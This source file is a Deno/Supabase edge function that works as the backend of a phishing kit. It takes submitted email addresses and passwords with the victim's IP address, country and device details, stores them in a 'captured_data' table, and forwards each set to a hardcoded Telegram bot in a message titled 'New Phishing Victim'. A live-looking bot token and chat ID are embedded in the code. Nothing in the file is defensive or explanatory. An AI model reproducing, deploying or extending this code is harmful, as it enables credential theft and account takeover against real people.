import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'npm:@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
}

interface CredentialData {
  email: string
  password: string
  attempt: number
  sessionId: string
  ip: string
  userAgent: string
  country?: string
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    const { email, password, attempt, sessionId, ip, userAgent, country }: CredentialData = await req.json()

    // Validate required fields
    if (!email || !password || !attempt || !sessionId || !ip) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    // Save to database
    const { data, error } = await supabase
      .from('captured_data')
      .insert([{
        session_id: sessionId,
        email: email,
        password: password,
        attempt_number: attempt,
        ip_address: ip,
        country: country || 'Unknown',
        user_agent: userAgent,
        is_bot_detected: false
      }])
      .select()

    if (error) {
      console.error('Database error:', error)
      return new Response(
        JSON.stringify({ error: 'Database error' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    // Send Telegram notification
    const telegramBotToken = '8576907699:AAERUGDvOzciJqZuCZDcK-jkvwupAjSFIkw'
    const telegramChatId = '953712851'

    console.log('Sending Telegram notification...')
    console.log('Bot Token:', telegramBotToken ? 'Set' : 'Not set')
    console.log('Chat ID:', telegramChatId ? 'Set' : 'Not set')

    try {
      const telegramMessage = `🎯 <b>New Phishing Victim</b>

👤 <b>Credentials:</b>
📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
🔄 Attempt: ${attempt}

🌍 <b>Visitor Info:</b>
🌐 IP: <code>${ip}</code>
🏳️ Country: ${country || 'Unknown'}
🕐 Time: ${new Date().toLocaleString()}

💻 <b>Device:</b>
<code>${userAgent}</code>`

      const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`
      console.log('Telegram URL:', telegramUrl)
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: telegramMessage,
          parse_mode: 'HTML'
        })
      })
      
      const telegramResult = await telegramResponse.json()
      console.log('Telegram response:', telegramResult)
    } catch (telegramError) {
      console.error('Telegram error:', telegramError)
      // Don't fail the request if Telegram fails
    }

    return new Response(
      JSON.stringify({ success: true, id: data[0]?.id }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    )

  } catch (error) {
    console.error('Function error:', error)
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    )
  }
})